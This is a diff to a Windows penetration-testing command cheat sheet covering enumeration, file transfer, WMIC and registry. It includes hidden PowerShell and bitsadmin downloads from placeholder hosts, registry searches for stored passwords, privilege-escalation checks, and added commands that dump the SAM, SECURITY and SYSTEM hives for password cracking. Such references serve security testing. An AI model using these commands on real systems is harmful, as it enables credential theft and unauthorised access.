@@ -86,6 +86,7 @@ Windows NT 4.0, 3.51, 3.50
 %SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 	
+	
 FILESYSTEM
 type file
 	-print file
@@ -110,7 +111,12 @@ accesschk.exe -uwdqs "Authenticated Users" c:\
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs "Authenticated Users" c:\*.*
 	-find weak file permissions per drive
+fsutil fsinfo drives
+	-list drives mounted by character identifier
+dir /a /s c:\ |find /c /v "svchost"
+tree C:\ /f /a > C:\Users\myself\Documents\tree.txt
 	
+
 File Transfer	
 iexplore.exe http://blah.com/filename.zip
 C:\windows\explorer.exe http://somewhere.com/filename.ext
@@ -119,7 +125,7 @@ bitsadmin /transfer systemrepair /download /priority normal http://path/to/file 
 powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"
 
 	
-USERS
+USERS/GROUPS
 whoami
 net users
 net user /domain
@@ -150,6 +156,9 @@ dsmod user /?
 	-get dsmod commands cruft
 dsmod user administrator -pwd NewPassword -mustchpwd yes
 	-modify user password, set pwExpired flag
+gpresult /z
+	-verbose output of group policy settings
+
 
 Permissions
 icacls "D:\test" /grant John:(OI)(CI)F /T
@@ -166,7 +175,7 @@ ICACLS Flags:
 	W (write-only access)
 
 
-NETWORK
+NETWORKING
 arp -A
 net view
 	-view available network share hosts
@@ -257,6 +266,7 @@ pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel
 icacls "dir\"
 	-check the file permissions of a folder
 
+	
 WMIC
 	WINDOWS MANAGEMENT INSTRUMENTATION
 **default xp configuration does not allow low priv(non-members of administrators group) to wmic; w7/8 by default allow access to low priv users
@@ -311,22 +321,35 @@ wmic logicaldisk get name
 wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
 wmic start list full
 	-list startup programs
+wmic process call create some.exe
 wmic computersystem get domain
 wmic ntdomain list
 	-domain and DC info
 wmic /user:[admin] /password:[password] /node:[machine-name] [commands]
 	-launch wmi management of a remote host
 PRIVESC enumeration
+wmic service list full
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 	-find unquote service path
 wmic useraccount list full
+wmic share list brief
+wmic startup list brief
 wmic os list full
+wmic bios
 
 	
 	
 REGISTRY
+*HKLM and HKCU are the Registry Domains (RegDomains)
 *note HKLM keys are for HKey local machine registry
 *HKCU keys are for HKey current user registry entries
+reg query RegDomain\Path\To\Key /v
+reg query 192.168.1.111 RegDomain\Path\To\Key /v 
+reg add RegDomain\Path\To\Key
+reg export RegDomain\Path\To\Key OUTFILE.ext
+reg import INFILE.ext
+reg save RegDomain\Hive OUTFILE
+	-5 basic registry commands commands
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 	-together allow users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM
@@ -341,8 +364,7 @@ REG add "HKLM\SYSTEM\CurrentControlSet\services\RpcSs" /v Start /t REG_DWORD /d 
 	-change startup type for rpc service to automatic
 REG add "HKLM\SYSTEM\CurrentControlSet\services\RpcSs" /v Start /t REG_DWORD /d 4 /f
 	-change startup type for rpc service to disabled
-reg add
-"HKEY_LOCAL_MACHINE\SYSTEM\Current ControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\Current ControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
 reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"
 	-(win7) curely registered executables within the system registry
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -363,6 +385,13 @@ reg query HKCU /f password /t REG_SZ /s [ |clip]
 	-Search the registry & copy/pipe to clipboard (optional)
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 	-snmp parameters
+reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"
+	-query returning securely registered executables within the system registry
+reg save HKLM\Security security.hive
+reg save HKLM\SAM sam.hive
+reg save HKLM\System system.hive && dir 
+	-save part of the registry to a file (useful for local password decryption)
+	
 	
 Active Directory
 dir ad:
